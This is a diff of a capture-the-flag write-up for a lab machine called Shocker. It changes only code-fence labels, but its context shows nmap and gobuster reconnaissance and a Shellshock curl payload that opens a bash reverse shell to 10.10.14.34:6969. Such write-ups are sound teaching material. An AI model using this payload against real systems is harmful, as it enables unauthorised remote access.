@@ -25,7 +25,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Unusual to find ssh on a port other than 22, a bit of security through obscurity perhaps, it may mean that it is somehow otherwise vulnerable.
 Lets check out this possibility with nmap...
 
-```
+```shell
 
 root@kali:~/HTB/prep/shocker# nmap -sSV 10.10.10.56 --script=vuln |tee -a shock.txt 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-09 18:40 GMT
@@ -61,7 +61,7 @@ Nothing immediately apparent, and nikto on the webport 80 gives nothing.
 
 gobuster finds /cgi-bin with a common.txt scan...we'll scan again looking for scripts...
 
-```
+```shell
 
 root@kali:~/HTB/retired# gobuster dir -u http://10.10.10.56/cgi-bin/ -w /root/wordlists/SecLists/Discovery/Web-Content/common.txt -x .sh,.txt,.php
 ===============================================================
@@ -111,7 +111,7 @@ Just an uptime test script
 
 Well, nothing usefull in itself, but what it does mean (cgi-bin accessible), is that this installation of Apache will likely be vulnerable to a Shellshock exploit.
 
-```
+```shell
 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.34/6969 0>&1' http://10.10.10.56/cgi-bin/user.sh
 
